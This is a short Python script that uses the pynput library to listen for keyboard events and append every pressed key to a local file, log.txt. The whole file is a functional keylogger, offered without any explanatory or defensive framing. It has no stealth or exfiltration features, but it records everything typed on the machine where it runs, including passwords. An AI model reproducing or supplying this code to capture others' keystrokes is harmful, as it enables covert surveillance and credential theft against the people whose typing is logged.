from pynput import keyboard

def onPress(key: object) -> None:
    with open("log.txt", "a") as log:
        log.write(f"{str(key)}\n")

listener = keyboard.Listener(on_press=onPress)
listener.run()
